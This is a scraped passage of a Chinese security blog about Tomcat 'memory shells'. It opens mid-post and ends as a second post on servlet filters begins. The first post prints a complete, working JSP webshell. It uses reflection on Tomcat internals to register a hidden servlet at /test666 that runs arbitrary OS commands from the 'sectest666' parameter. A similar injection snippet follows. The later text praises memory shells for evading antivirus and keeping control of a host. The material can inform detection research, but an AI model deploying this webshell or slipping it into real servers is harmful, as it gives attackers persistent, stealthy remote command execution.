class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardWrapper"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ContainerBase"</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;servletContext&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">TomcatServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * webshell命令参数名</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String cmdParamName = <span class="string">"sectest666"</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String cmd;</span><br><span class="line">        <span class="keyword">if</span> ((cmd = req.getParameter(cmdParamName)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                    <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">            StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            resp.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">            resp.getOutputStream().flush();</span><br><span class="line">            resp.getOutputStream().close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">test666</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//获取各字段</span></span><br><span class="line">            java.lang.reflect.Field WRAP_SAME_OBJECT=Class.forName(<span class="string">"org.apache.catalina.core.ApplicationDispatcher"</span>).getDeclaredField(<span class="string">"WRAP_SAME_OBJECT"</span>);</span><br><span class="line">            Class applicationFilterChain = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationFilterChain"</span>);</span><br><span class="line">            java.lang.reflect.Field lastServicedRequest = applicationFilterChain.getDeclaredField(<span class="string">"lastServicedRequest"</span>);</span><br><span class="line">            java.lang.reflect.Field lastServicedResponse = applicationFilterChain.getDeclaredField(<span class="string">"lastServicedResponse"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//去掉final修饰符</span></span><br><span class="line">            java.lang.reflect.Field modifiers = java.lang.reflect.Field.class.getDeclaredField("modifiers");</span><br><span class="line">            modifiers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            modifiers.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置允许访问</span></span><br><span class="line">            WRAP_SAME_OBJECT.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            lastServicedRequest.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            lastServicedResponse.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//如果是第一次请求，则修改各字段，否则获取cmd参数执行命令并返回结果</span></span><br><span class="line">            <span class="keyword">if</span>(!WRAP_SAME_OBJECT.getBoolean(<span class="keyword">null</span>))&#123;</span><br><span class="line">                WRAP_SAME_OBJECT.setBoolean(<span class="keyword">null</span>,<span class="keyword">true</span>);</span><br><span class="line">                lastServicedRequest.set(<span class="keyword">null</span>,<span class="keyword">new</span> ThreadLocal());</span><br><span class="line">                lastServicedResponse.set(<span class="keyword">null</span>,<span class="keyword">new</span> ThreadLocal());</span><br><span class="line">                out.println(<span class="string">"WRAP_SAME_OBJECT change success!please try again for Inject Servlet"</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ThreadLocal&lt;javax.servlet.ServletRequest&gt; threadLocalRequest = (ThreadLocal&lt;javax.servlet.ServletRequest&gt;) lastServicedRequest.get(<span class="keyword">null</span>);</span><br><span class="line">                javax.servlet.ServletRequest request1 = threadLocalRequest.get();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//获取servletContext</span></span><br><span class="line">                    javax.servlet.ServletContext servletContext=request1.getServletContext();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//获取applicationContext</span></span><br><span class="line">                    java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                    <span class="comment">//获取standardContext</span></span><br><span class="line">                    contextField=applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">                    Field serviceF = applicationContext.getClass().getDeclaredField(<span class="string">"service"</span>);</span><br><span class="line">                    serviceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    StandardService service = (StandardService) serviceF.get(applicationContext);</span><br><span class="line">                    Mapper mapper = service.getMapper();</span><br><span class="line">                    Field contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField(<span class="string">"contextObjectToContextVersionMap"</span>);</span><br><span class="line">                    contextObjectToContextVersionMapF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    ConcurrentHashMap contextObjectToContextVersionMap = (ConcurrentHashMap ) contextObjectToContextVersionMapF.get(mapper);</span><br><span class="line">                    Object contextVersion = contextObjectToContextVersionMap.get(standardContext);</span><br><span class="line">                    java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");</span><br><span class="line">                    stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Wrapper wrapper = (Wrapper) standardContext.findChild(<span class="string">"test"</span>);</span><br><span class="line">                    <span class="keyword">if</span>(wrapper ==<span class="keyword">null</span>) &#123;</span><br><span class="line">                        TomcatServlet tomcatServlet=<span class="keyword">new</span> TomcatServlet(); </span><br><span class="line">                        StandardWrapper wrappershell = (StandardWrapper) standardContext.createWrapper();</span><br><span class="line">                        Field instanceF = wrappershell.getClass().getDeclaredField(<span class="string">"instance"</span>);</span><br><span class="line">                        instanceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        instanceF.set(wrappershell,tomcatServlet);</span><br><span class="line">                        wrappershell.setServletClass(<span class="string">"TomcatServlet"</span>);</span><br><span class="line">                        Field parent = ContainerBase.class.getDeclaredField("parent");</span><br><span class="line">                        parent.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        parent.set(wrappershell, standardContext);</span><br><span class="line">                        wrappershell.addMapping(<span class="string">"/test666"</span>);</span><br><span class="line">                        Class[] classes = mapper.getClass().getDeclaredClasses();</span><br><span class="line">                        Class contextversionClass = classes[<span class="number">1</span>];</span><br><span class="line">                        Method addWrapper = mapper.getClass().getDeclaredMethod(<span class="string">"addWrapper"</span>, contextversionClass, String<span class="class">.<span class="keyword">class</span>, <span class="title">Wrapper</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>)</span>;</span><br><span class="line">                        addWrapper.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        addWrapper.invoke(mapper, contextVersion, <span class="string">"/test666"</span>, wrappershell, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">                        out.println(<span class="string">"Servlet has been Inject,please visit /test666?sectest666=whoami"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="servlet内存马卸载"><a href="#servlet内存马卸载" class="headerlink" title="servlet内存马卸载"></a>servlet内存马卸载</h2><p>​        查看org.apache.catalina.mapper.Mapper代码，发现代码中存在org.apache.catalina.mapper.Mapper#removeWrapper(org.apache.catalina.mapper.Mapper.ContextVersion, java.lang.String)方法，只需要传入ContextVersion对象和path即可完成内存马的卸载。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210105115051752.png" alt="image-20210105115051752"></p>
<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="comment">//获取servletContext</span></span><br><span class="line">                   javax.servlet.ServletContext servletContext=req.getServletContext();</span><br><span class="line">                   <span class="comment">//获取applicationContext</span></span><br><span class="line">                   java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                   contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                   org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                   <span class="comment">//获取standardContext</span></span><br><span class="line">                   contextField=applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                   contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                   org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">                   Field serviceF = applicationContext.getClass().getDeclaredField(<span class="string">"service"</span>);</span><br><span class="line">                   serviceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                   StandardService service = (StandardService) serviceF.get(applicationContext);</span><br><span class="line">                   Mapper mapper = service.getMapper();</span><br><span class="line">                   Field contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField(<span class="string">"contextObjectToContextVersionMap"</span>);</span><br><span class="line">                   contextObjectToContextVersionMapF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                   ConcurrentHashMap contextObjectToContextVersionMap = (ConcurrentHashMap ) contextObjectToContextVersionMapF.get(mapper);</span><br><span class="line">                   Object contextVersion = contextObjectToContextVersionMap.get(standardContext);</span><br><span class="line">                   java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");</span><br><span class="line">                   stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                       TomcatServlet tomcatServlet=<span class="keyword">new</span> TomcatServlet();</span><br><span class="line">                       StandardWrapper wrappershell = (StandardWrapper) standardContext.createWrapper();</span><br><span class="line">                       Field instanceF = wrappershell.getClass().getDeclaredField(<span class="string">"instance"</span>);</span><br><span class="line">                       instanceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                       instanceF.set(wrappershell,tomcatServlet);</span><br><span class="line">                       wrappershell.setServletClass(<span class="string">"TomcatServlet"</span>);</span><br><span class="line">                       Field parent = ContainerBase.class.getDeclaredField("parent");</span><br><span class="line">                       parent.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                       parent.set(wrappershell, standardContext);</span><br><span class="line">                       wrappershell.addMapping(<span class="string">"/test666"</span>);</span><br><span class="line">                       Class[] classes = mapper.getClass().getDeclaredClasses();</span><br><span class="line">                       Class contextversionClass = classes[<span class="number">1</span>];</span><br><span class="line">                       Method addWrapper = mapper.getClass().getDeclaredMethod(<span class="string">"addWrapper"</span>, contextversionClass, String<span class="class">.<span class="keyword">class</span>, <span class="title">Wrapper</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>)</span>;</span><br><span class="line">                       addWrapper.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                       addWrapper.invoke(mapper, contextVersion, <span class="string">"/test666"</span>, wrappershell, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">               &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/" class="post-title-link" itemprop="url">Tomcat内存马实现原理解析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-12-24 13:40:03" itemprop="dateCreated datePublished" datetime="2020-12-24T13:40:03+08:00">2020-12-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-12-31 09:58:18" itemprop="dateModified" datetime="2020-12-31T09:58:18+08:00">2020-12-31</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​            目前webshell的免杀开始向内存中迁移，这样实现的好处显而易见，将webshell注入到内存中，一方面增加了查杀的难度，另一方面即使我们传入的文件被查杀，只要服务器不重启，我们仍然可以利用注入到内存中的shell控制主机，所以了解内存shell的实现是比较重要的。</p>
<h2 id="动态注册Filter实现内存马"><a href="#动态注册Filter实现内存马" class="headerlink" title="动态注册Filter实现内存马"></a>动态注册Filter实现内存马</h2><p>​            要了解如何动态实现filter过滤器加载内存马，首先得了解几个问题</p>
<ul>
<li>什么是过滤器?</li>
<li>为什么要使用过滤器？</li>
<li>如何手动创建过滤器？</li>
<li>如何动态注册过滤器？</li>
</ul>
<h3 id="什么是过滤器及为什么要使用过滤器？"><a href="#什么是过滤器及为什么要使用过滤器？" class="headerlink" title="什么是过滤器及为什么要使用过滤器？"></a><strong>什么是过滤器及为什么要使用过滤器？</strong></h3><p>​        Filter也叫做过滤器，通过过滤器，可以根据访问URL的不同，对访问进行拦截处理，也可以在服务端响应给客户端之前对处理响应消息。</p>
<p>​        在servlet中提供了Filter接口，如果我们实现这个接口并实现其中的方法，可以将自己的类注册成过滤器。Filter接口定义了如下三个方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">            FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>​        一般我们需要关注和实现的是doFilter方法，当我们去访问某个servlet程序，如果发现注册了filter对该servlet进行拦截，则会首先去执行filter中的doFilter方法，根据doFilter中的结果决定是否去执行servlet中的service方法。同样我们也可以通过doFilter方法，在执行service方法之前和之后执行自定义操作。</p>
<p>​        我们仔细观察doFilter方法的定义，可以看到FilterChain参数，这就是过滤器链。如果我们想要实现通过多个Filter对同一个servlet请求进行拦截，就需要用到过滤器链。过滤器链的拦截顺序和web.xml中配置的顺序有关，当执行上一个Filter的doFilter方法是，通过FilterChain.doFilter执行下一个过滤器的doFilter方法。</p>
<h3 id="如何手动创建一个过滤器？"><a href="#如何手动创建一个过滤器？" class="headerlink" title="如何手动创建一个过滤器？"></a><strong>如何手动创建一个过滤器？</strong></h3><p>​        Filter过滤器的实现有两种，第一种是在web.xml种进行配置，另一种是使用@WebFilter注解。我们首先看第一种方式。</p>
<p><strong>web.xml配置过滤器</strong></p>
<p>​        首先我们要创建一个web项目，并创建一个servlet，可以参考<code>https://blog.csdn.net/yhao2014/article/details/45740111</code>搭建，注册一个HelloWorld servlet：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        message = <span class="string">"Hello world, this message is from servlet!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">//设置响应内容类型</span></span><br><span class="line">        resp.setContentType(<span class="string">"text/html"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置逻辑实现</span></span><br><span class="line">        PrintWriter out = resp.getWriter();</span><br><span class="line">        out.println(<span class="string">"&lt;h1&gt;"</span> + message + <span class="string">"&lt;/h1&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225112417193.png" alt="image-20201225112417193"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225112241202.png" alt="image-20201225112241202"></p>
<p>​        </p>
<p>​        下面我们实现一个Filter在输出hello world之前和之后执行自定义操作，首先在web.xml中配置Filter</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;FirstFilter&lt;/filter-name&gt;   //注册过滤器，过滤器名为FirstFilter</span><br><span class="line">    &lt;filter-<span class="class"><span class="keyword">class</span>&gt;<span class="title">FirstFilter</span>&lt;/<span class="title">filter</span>-<span class="title">class</span>&gt; //过滤器类为<span class="title">FirstFilter</span></span></span><br><span class="line"><span class="class">    &lt;<span class="title">init</span>-<span class="title">param</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">param</span>-<span class="title">name</span>&gt;<span class="title">encoding</span>&lt;/<span class="title">param</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">param</span>-<span class="title">value</span>&gt;<span class="title">GB2312</span>&lt;/<span class="title">param</span>-<span class="title">value</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">init</span>-<span class="title">param</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">filter</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">filter</span>-<span class="title">name</span>&gt;<span class="title">FirstFilter</span>&lt;/<span class="title">filter</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">url</span>-<span class="title">pattern</span>&gt;/*&lt;/<span class="title">url</span>-<span class="title">pattern</span>&gt;  //经过<span class="title">FirstFilter</span>处理的<span class="title">URL</span>，这里是所有的<span class="title">URL</span>都会经过这个过滤器处理。</span></span><br><span class="line"><span class="class">&lt;/<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​        创建过滤器类，在执行servlet之前执行对应的操作</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        chain.doFilter(req, resp);</span><br><span class="line">        PrintWriter out = resp.getWriter();</span><br><span class="line">        out.println(<span class="string">"&lt;h1&gt;执行后&lt;/h1&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​            打断点调试，可以看到执行HelloWorld之前，首先经过了FirstFilter拦截器的处理，并在执行完HelloWorld的doGet方法后执行后，回到了FirstFilter中的doFilter方法对response追加testing666。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225114624897.png" alt="image-20201225114624897"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225114725785.png" alt="image-20201225114725785"></p>
<p>​        执行结果如下：</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225114506040.png" alt="image-20201225114506040"></p>
<p>​    我们再尝试创建一个过滤器链，再添加一个过滤器，再web.xml中进行配置，配置如下：</p>
